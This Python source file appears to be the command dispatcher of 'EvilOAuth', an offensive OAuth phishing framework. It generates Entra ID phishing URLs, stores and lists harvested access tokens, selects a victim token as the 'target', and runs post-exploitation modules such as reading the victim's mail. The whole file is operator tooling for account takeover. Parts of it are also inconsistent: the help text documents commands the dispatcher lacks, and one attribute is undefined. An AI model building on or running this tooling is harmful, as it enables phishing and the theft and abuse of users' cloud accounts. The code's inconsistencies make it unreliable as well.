import sys
import logging
from diskcache import Cache
from eviloauth.idp import IDP
from eviloauth.exceptions import EviloauthCommandException
from eviloauth.access_token import AccessToken
from eviloauth import app, cache, temp_dir, load_modules
from datetime import datetime, timedelta

class TokenManager:
    def __init__(self, cache_dir, general_cache):
        self.cache = Cache(cache_dir)
        self.general_cache = general_cache

    def list_tokens(self):
        general_tokens = self.general_cache.get('tokens', {})
        return list(general_tokens.keys())
    
    def add(self, access_token):
        if isinstance(access_token, AccessToken):
            token_key = str(access_token)
            self.cache.set(token_key, access_token)
            return token_key
            
    def delete(self, token_key):
            if token_key in self.cache:
                self.cache.delete(token_key)
                return True
            return False

    def list(self):
        return [key for key in self.cache.keys()]
        
class Dispatcher:
    def __init__(self, flask_server, module_dict, redirect_server, cache):
        self.flask_server = flask_server
        self.module_dict = module_dict
        self.redirect_server = redirect_server
        self.cache = cache
        self.token_manager = TokenManager(temp_dir, cache) 
        
    @classmethod
    def get_token_manager(cls):
        if cls.instance:
            return cls.instance.token_manager
        else:
            return None

    def dispatch(self, commands):
        cmd_parts = commands.split(' ')
        cmd = cmd_parts[0]
        cmd_args = cmd_parts[1:]

        if cmd == 'exit':
            self.dispatch_exit()
        elif cmd == 'module' and len(cmd_args) >= 2:
            self.dispatch_module(cmd_args[0], cmd_args[1], cmd_args[2:])
        elif cmd == 'tokens':
            self.dispatch_tokens(cmd_args)  # Handles all token-related commands
        elif cmd == 'idp':
            self.dispatch_idp(cmd_args)  # Handles IDP related commands
        elif cmd == 'target':
            self.dispatch_target(cmd_args)  # Handles target-related commands
        elif cmd == 'url':
            self.dispatch_url()  # Displays the phishing URL
        elif cmd == 'help':
            self.dispatch_help(cmd_args)  # Displays help information
        else:
            raise EviloauthCommandException(f'Unknown command {cmd}')

    def dispatch_exit(self):
        print('Exiting...')
        self.flask_server.shutdown()
        sys.exit()

    def dispatch_module(self, module_name, sub_module_name, module_args):
        full_module_name = f'eviloauth.module.{module_name}.{sub_module_name}'

        if full_module_name in self.module_dict:
            mod = self.module_dict[full_module_name]

            target_access_token = cache.get('target')

            if not module_args:
                module_args = [target_access_token, 0]
            elif len(module_args) == 1:
                module_args.append(0)

            mod.__run__(*module_args)
        else:
            logging.error(f'Module {full_module_name} not found')

    def dispatch_idp(self, cmd_args):
        if len(cmd_args) >= 1:
            sub = cmd_args[0]
            arg = cmd_args[1] if len(cmd_args) > 1 else None

            if sub == 'list':
                print('Current IDP: %s' % self.cache.get('idp'))
            elif sub == 'configure' and arg:
                idp = IDP(arg, self.redirect_server)
                self.cache.set('idp', idp)
                self.phishing_url = idp.get_phishing_url()
                print(f"Phishing URL set: {self.phishing_url}")
            else:
                raise EviloauthCommandException(f'Unknown idp command: {sub}')
        else:
            logging.error("Invalid arguments for idp command")

    def dispatch_tokens(self, cmd_args):
        logging.info(f"cmd_args: {cmd_args}")  # For debugging

        if len(cmd_args) >= 1:
            subcmd = cmd_args[0]

            if subcmd == 'list':
                self.handle_tokens_list(cmd_args)

            elif subcmd == 'delete' and len(cmd_args) == 2:
                self.handle_tokens_delete(cmd_args)

            else:
                raise EviloauthCommandException(f'Unknown subcommand {subcmd}')

    def handle_tokens_list(self, cmd_args):
        if len(cmd_args) > 1:
            token_key = cmd_args[1].strip("'")
            logging.info(f"Fetching token details for key: {token_key}")

            general_tokens = self.token_manager.cache.get('tokens', {})
            logging.info(f"Current tokens in cache: {list(general_tokens.keys())}")

            if token_key in general_tokens:
                token_obj = general_tokens[token_key]

                if token_obj:
                    token_details = token_obj.get_token_details()

                    print(f"Details for token {token_key}:")
                    for detail, value in token_details.items():
                        print(f"  {detail.capitalize()}: {value}")
                else:
                    logging.warning(f"No token object found for key: {token_key}")
                    print(f"No token found for key: {token_key}")
            else:
                logging.warning(f"Token key {token_key} not found in cache")
                print(f"No token found for key: {token_key}")
        else:
            general_tokens = self.token_manager.cache.get('tokens', {})
            print("Available token keys:", list(general_tokens.keys()))

    def handle_tokens_delete(self, cmd_args):
        if len(cmd_args) == 2 and cmd_args[0] == 'delete':
            token_key = cmd_args[1]
            if self.token_manager.delete(token_key):
                print(f"Token {token_key} deleted successfully.")
            else:
                print(f"Token {token_key} not found or could not be deleted.")

    def dispatch_configure(self, cmd_args):
        if len(cmd_args) >= 2:
            sub = cmd_args[0]
            arg = cmd_args[1]

            if sub == 'idp':
                if arg in ['entra_implicit_flow', 'entra_code_flow']:
                    idp = IDP(arg, self.redirect_server)
                    self.cache.set('idp', idp)
                    self.phishing_url = idp.get_phishing_url()
                    print(f"Phishing URL set: {self.phishing_url}")
                else:
                    logging.error(f"IDP {arg} is not supported. Supported IDPs: ['entra_implicit_flow', 'entra_code_flow']")
        else:
            logging.error("Invalid arguments for configure command")

    def handle_target_set(self, token_key):
        # Check for the token in the general cache instead of the token manager's cache
        general_tokens = self.token_manager.general_cache.get('tokens', {})
        if token_key in general_tokens:
            self.cache.set('target', general_tokens[token_key])
            logging.info(f"Target set to {token_key}")
        else:
            logging.error(f"Token {token_key} not found")

    def handle_target_list(self):
        current_target = self.cache.get('target')
        if current_target:
            print(f"Current Target:\n{current_target}")
        else:
            print(f"No targets set.\nTo set a target use the following command: target set <token name>")

    def dispatch_target(self, cmd_args):
        if len(cmd_args) >= 1:
            sub = cmd_args[0]

            if sub == 'set':
                if len(cmd_args) >= 2:
                    token_key = cmd_args[1]
                    self.handle_target_set(token_key)
                else:
                    logging.error("No token key provided for target set")
            elif sub == 'list':
                self.handle_target_list()
            else:
                raise EviloauthCommandException(f'Unknown target command: {sub}')
        else:
            logging.error("Invalid arguments for target command")

    def dispatch_url(self):
        if self.phishing_url:
            print(f"Phishing URL:\n{self.phishing_url}")
        else:
            print("Phishing URL not set. Please run 'configure idp' first.")

    def dispatch_help(self, cmd_args):
        if not cmd_args or len(cmd_args) == 0:
            self.display_general_help()
        elif cmd_args[0] == 'modules':
            self.display_modules_help()
        elif cmd_args[0] == 'tokens':
            self.display_tokens_help()
        elif cmd_args[0] == 'configure':
            self.display_configure_help()
        elif cmd_args[0] == 'url':
            self.display_url_help()
        else:
            print(f"No specific help available for '{cmd_args[0]}'")

    def display_general_help(self):
        help_text = """
        EvilOAuth General Help:

        Commands:
        - exit: Exits the application.
        - modules: Manages different modules.
        - tokens: Manages tokens.
        - configure: Configures the Identity Provider.
        - url: Displays the phishing URL.
        - help: Displays help information.

        For detailed help on specific commands, type 'help <command>'.
        """
        print(help_text)

    def display_modules_help(self):
        help_text = """
        Modules Command Help:

        Usage: modules <module_name> <sub_module_name> <sub_module_action>

        - Runs a specified module.
        - Example: modules read_mail imap read
        """
        print(help_text)

    def display_tokens_help(self):
        help_text = """
        Tokens Command Help:

        Usage: tokens <subcommand> [<args>]

        Subcommands:
        - list [<token_key>]: Lists all tokens or details of a specific token.
        - set <token_key> <attribute> <value>: Updates attributes of a token.
        - delete <token_key>: Deletes a specified token.

        Attributes for 'set' subcommand:
        - upn: Updates the User Principal Name.
        - scope: Updates the scope.
        - expiry: Updates the expiry time in HHMM format.

        Example: tokens set OAT-example upn new-upn@example.com
        """
        print(help_text)

    def display_configure_help(self):
        help_text = """
        Configure Command Help:

        Usage: configure idp <idp_name>

        - Configures the Identity Provider.
        - Supported IDPs: entra_implicit_flow, entra_code_flow
        - Example: configure idp entra_implicit_flow
        """
        print(help_text)

    def display_url_help(self):
        help_text = """
        URL Command Help:

        Usage: url

        - Displays the phishing URL if set.
        - Requires running 'configure idp' command first.
        """
        print(help_text)